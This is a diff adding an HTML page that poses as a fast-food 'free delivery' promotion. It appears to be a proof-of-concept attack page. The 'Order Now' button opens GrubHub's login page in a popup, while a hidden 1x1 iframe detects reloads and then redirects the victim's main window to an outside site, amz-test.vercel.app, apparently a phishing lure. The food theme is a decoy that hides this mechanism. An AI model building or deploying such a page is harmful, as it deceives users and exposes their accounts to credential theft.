@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>🍕 Free Delivery Weekend Special!</title>
+	<style type="text/css">
+		body {
+			font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+			background: linear-gradient(135deg, #FF6B35 0%, #F7931E 30%, #FFD23F 70%, #FF4757 100%);
+			margin: 0;
+			padding: 50px 20px;
+			min-height: 100vh;
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			justify-content: center;
+		}
+
+		#blackdiv {
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background: rgba(0, 0, 0, 0.1);
+			pointer-events: none;
+			z-index: 1;
+		}
+
+		.container {
+			text-align: center;
+			background: rgba(255, 255, 255, 0.95);
+			backdrop-filter: blur(20px);
+			border-radius: 25px;
+			padding: 60px 40px;
+			border: 2px solid rgba(255, 107, 53, 0.3);
+			box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+			max-width: 600px;
+			position: relative;
+			z-index: 2;
+		}
+
+		.logo {
+			font-size: 4rem;
+			font-weight: 900;
+			background: linear-gradient(45deg, #FF6B35, #F7931E, #FFD23F);
+			-webkit-background-clip: text;
+			-webkit-text-fill-color: transparent;
+			margin-bottom: 20px;
+			letter-spacing: 2px;
+			text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+		}
+
+		.promo-text {
+			font-size: 1.8rem;
+			color: #D32F2F;
+			margin-bottom: 30px;
+			font-weight: 700;
+		}
+
+		.offer-banner {
+			background: linear-gradient(45deg, #4CAF50, #8BC34A);
+			color: white;
+			padding: 20px 30px;
+			border-radius: 15px;
+			font-size: 1.5rem;
+			font-weight: bold;
+			margin-bottom: 40px;
+			animation: pulse 2s infinite;
+		}
+
+		@keyframes pulse {
+			0%, 100% { transform: scale(1); }
+			50% { transform: scale(1.05); }
+		}
+
+		.cta-button {
+			background: linear-gradient(45deg, #FF5722, #FF9800);
+			color: white;
+			border: none;
+			padding: 20px 50px;
+			border-radius: 30px;
+			font-size: 1.4rem;
+			font-weight: 700;
+			cursor: pointer;
+			transition: all 0.3s ease;
+			text-transform: uppercase;
+			letter-spacing: 2px;
+			text-decoration: none;
+			display: inline-block;
+			box-shadow: 0 10px 30px rgba(255, 87, 34, 0.4);
+			border: 2px solid #FF5722;
+			text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+		}
+
+		.cta-button:hover {
+			transform: translateY(-3px);
+			box-shadow: 0 15px 40px rgba(255, 87, 34, 0.6);
+			background: linear-gradient(45deg, #FF9800, #FFC107);
+		}
+
+		.features {
+			margin-top: 30px;
+			color: #424242;
+			font-size: 1.1rem;
+			line-height: 1.6;
+		}
+
+		.food-icons {
+			position: absolute;
+			font-size: 2rem;
+			animation: float 4s ease-in-out infinite;
+		}
+
+		@keyframes float {
+			0%, 100% { opacity: 0.6; transform: translateY(0px) rotate(0deg); }
+			50% { opacity: 1; transform: translateY(-15px) rotate(10deg); }
+		}
+	</style>
+</head>
+<body>
+
+	<div id="blackdiv"></div>
+
+	<div class="food-icons" style="top: 15%; left: 10%;">🍕</div>
+	<div class="food-icons" style="top: 25%; right: 15%;">🍔</div>
+	<div class="food-icons" style="top: 65%; left: 20%;">🌮</div>
+	<div class="food-icons" style="bottom: 20%; right: 25%;">🍜</div>
+	<div class="food-icons" style="top: 70%; right: 10%;">🍰</div>
+	<div class="food-icons" style="bottom: 30%; left: 15%;">🥗</div>
+
+	<div class="container">
+		<div class="logo">EAT NOW!!!</div>
+		<div class="promo-text">Fast Delivery • Fresh Food • Great Taste</div>
+		<div class="offer-banner">🚚 FREE DELIVERY ALL WEEKEND! 🚚</div>
+		
+		<a href="#" onclick="launch()" class="cta-button">Order Now</a>
+		
+		<div class="features">
+			🍕 Over 500 Local Restaurants<br>
+			⚡ 30-Minute Delivery Guarantee<br>
+			💳 Safe & Secure Payment<br>
+			⭐ 4.9/5 Customer Rating
+		</div>
+	</div>
+
+	<!-- iframe do GrubHub (mesmo domínio que o popup) -->
+	<iframe src="https://www.grubhub.com/img-hashed/grubhub_logo_img-e0f95e3ac8650e76d491975c5f53d2a9.svg/$%5E%&*" onload="switcher()" name="amazonloginpopup" style="opacity: 0.01;" width=1 height=1></iframe>
+
+	<script type="text/javascript">
+		let iframeLoaded = false;
+		let loginWindow;
+
+		var loadedOnce = false;
+		var launched = false;
+
+		function switcher() {
+			console.log('Switcher called - loadedOnce:', loadedOnce, 'launched:', launched);
+			if (!loadedOnce) {
+				loadedOnce = true;
+				console.log('First time loading iframe');
+			} else {
+				if (launched) {
+					console.log('Second time + launched = true, redirecting...');
+					top.focus();
+					top.location = "https://www.amz-test.vercel.app";
+				}
+			}
+		}
+
+		function launch() {
+			launched = true;
+			console.log('Opening GrubHub...');
+			loginWindow = window.open("https://www.grubhub.com/login", "login");
+		}
+	</script>
+
+</body>
+</html>
